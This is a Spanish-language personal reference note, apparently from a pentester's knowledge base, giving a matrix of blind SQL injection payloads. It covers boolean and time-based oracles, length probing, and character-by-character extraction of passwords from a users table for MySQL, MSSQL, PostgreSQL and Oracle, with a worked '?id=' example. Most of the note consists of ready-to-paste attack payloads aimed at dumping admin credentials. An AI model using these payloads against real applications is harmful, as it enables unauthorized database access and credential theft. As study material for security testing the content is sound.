---
tipo: meta
visibilidad: publica
creado: 2026-08-06
aliases:
  - Payloads ciego
  - SQLi inferencial
tags:
  - meta/referencia
  - dominio/web
---

# SQLi ciego - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cubre los dos canales inferenciales: [[SQLi - canal booleano ciego]] y [[SQLi - canal temporal ciego]]. Comparten toda la lógica de extracción; **solo cambia el oráculo** —diferencia en la respuesta vs. retardo—, así que va una sola matriz.
>
> Confirmación de inyección y cierre: comunes, ver [[SQLi UNION - matriz de referencia]] pasos 0-2. `yi``  ` copia el payload.

## El oráculo — lo único que cambia entre los dos canales

| Canal | Verdadero | Falso |
|---|---|---|
| Booleano | la página cambia (texto, largo, código) | vuelve a la forma base |
| Temporal | la respuesta **tarda** N segundos | responde al instante |

Todo lo de abajo es la **condición** que se mete en el oráculo. Para booleano se usa tal cual; para temporal se envuelve en el `IF/sleep` del paso 4.

## 1. Confirmar el oráculo

`' AND 1=1-- -`  vs  `' AND 1=2-- -`
Booleano: la primera deja la página normal, la segunda la cambia. Si no cambia, no hay oráculo booleano.

`' AND sleep(3)-- -`
Temporal: si tarda 3 segundos, el oráculo temporal existe. (MSSQL `WAITFOR DELAY '0:0:3'`, PgSQL `pg_sleep(3)`, Oracle `dbms_pipe.receive_message(('a'),3)`.)

## 2. Medir el objetivo antes de extraer

`' AND (SELECT length(password) FROM users WHERE username='admin')>20-- -`
Largo del dato. Se hace búsqueda binaria sobre el número: `>20`, `>10`, `>15`… hasta fijarlo. Ahorra pedir caracteres que no existen.

## 3. Extraer carácter por carácter (la condición)

`substring((SELECT password FROM users LIMIT 1),1,1)='a'`
Compara el primer carácter con `a`. Iterar la posición (`,1,1` → `,2,1` → …) y la letra.

`substring((SELECT password FROM users LIMIT 1),1,1)>'m'`
**Búsqueda binaria**: en vez de probar 26+ letras, se parte el rango. `>'m'`, después `>'s'` o `>'g'`… 7 preguntas por carácter en vez de decenas.

`ascii(substring((SELECT password FROM users LIMIT 1),1,1))>109`
Igual pero por código ASCII — evita comillas si están filtradas y cubre todo el rango de bytes.

## 4. Envolver para el canal temporal

La condición del paso 3 se mete acá para convertir el bit en tiempo.

`' AND IF( ascii(substring((SELECT password FROM users LIMIT 1),1,1))>109, sleep(3), 0)-- -`
MySQL. Si el carácter supera el código 109, tarda 3 s.

`'; IF( ascii(substring((SELECT TOP 1 password FROM users),1,1))>109 ) WAITFOR DELAY '0:0:3'-- -`
MSSQL.

`' AND (SELECT CASE WHEN (ascii(substring((SELECT password FROM users LIMIT 1),1,1))>109) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -`
PostgreSQL.

## 5. Automatizar

Extraer un hash a mano son cientos de peticiones: en la práctica esto se corre con `sqlmap` una vez confirmado el punto y el oráculo. Ver [[sqlmap]]. La matriz sirve para entender qué hace por dentro y para el paso manual de confirmación.

## Ejemplo — booleano

```
1. ?id=1' AND 1=1-- -   → aparece "Bienvenido"
   ?id=1' AND 1=2-- -   → no aparece   → oráculo: presencia de "Bienvenido"

2. ?id=1' AND (SELECT length(password) FROM users WHERE username='admin')>30-- -
   → sin "Bienvenido" (falso) → el largo es <=30, seguir acotando

3. ?id=1' AND ascii(substring((SELECT password FROM users WHERE username='admin'),1,1))>109-- -
   → con "Bienvenido" (verdadero) → primer carácter tiene código >109
   binaria: >120 falso, >114 falso, >111 verdadero, >112 falso → código 112 = 'p'

4. repetir con substring(...,2,1), (...,3,1)…
```

## Coste

| | Peticiones por carácter | Espera |
|---|---|---|
| Booleano + binaria | ~7 | ninguna |
| Temporal + binaria | ~7 | 3 s por pregunta verdadera |

Un hash de 60 caracteres: ~420 peticiones. Por eso el árbol prueba fuera de banda antes que esto.

## Relacionadas

[[SQLi - canal booleano ciego]] · [[SQLi - canal temporal ciego]] · [[MOC - SQL injection]] · [[Dialectos SQL - matriz de referencia]]
